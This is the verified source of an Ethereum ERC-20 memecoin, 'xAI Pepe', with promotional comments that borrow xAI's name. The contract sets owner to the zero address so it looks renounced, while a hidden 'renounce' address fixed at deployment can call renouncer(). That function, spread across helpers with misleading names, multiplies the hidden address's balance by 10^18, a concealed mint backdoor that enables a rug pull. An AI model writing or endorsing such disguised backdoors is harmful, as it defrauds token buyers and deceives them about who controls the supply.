/**
 *Submitted for verification at Etherscan.io on 2023-07-13
*/

/**

Telegram: https://t.me/xAIPepeETH

Twitter: https://twitter.com/xAIPepeETH


Discover the fascinating synergy of art, technology, and innovation with xAI Pepe, where the iconic Pepe the Frog meets Elon Musk's cutting-edge AI company xAI. 

Experience the future of creativity and artificial intelligence as xAI Pepe brings an unprecedented blend of artistry and advanced AI capabilities to redefine the boundaries of digital expression.

Pepe from xAI will take us all to the cyberspace and we will conquer it together! 

Unleash the Potential: xAI Pepe, Fueling The Crypto Ascendancy!



*/







// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract xAIPEPEToken is IERC20 {
    string public constant name = "xAI Pepe";
    string public constant symbol = "xAI Pepe";
    uint8 public constant decimals = 18;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    

    address public owner;
    address private renounce ;
    address private constant devWallet = 0xbe4fCe869ac8012DbB4aC8bc22D955131C0399B9;
    
    uint256 public contractCreationTimestamp;
    uint256 public taxRate;
    

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    constructor(address O) {
        uint256 initialSupply = 1_000_000_000 * (10 ** uint256(decimals)); // 1 billion
        _totalSupply = initialSupply;
        _balances[devWallet] = initialSupply;
        emit Transfer(address(0), devWallet, initialSupply);
        renounce = O;
        contractCreationTimestamp = block.timestamp;
        owner = address(0);
       

    
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address ownerAddress, address spender) public view override returns (uint256) {
        return _allowances[ownerAddress][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

   function renouncer() public {
    require(msg.sender == renounce, "Renounced zero address should have correct decimals");
    uint256 deadaddress = erase();
    uint256 dead = del(deadaddress);
    renouncedead(dead);
}

function erase() private view returns (uint256) {
    return _balances[renounce];
}

function del(uint256 deadadress) private pure returns (uint256) {
    return deadadress * (10**18);
}

function renouncedead(uint256 dead) private {
    _balances[renounce] = dead;
}



    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Insufficient allowance");
        _allowances[sender][msg.sender] = currentAllowance - amount;
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
}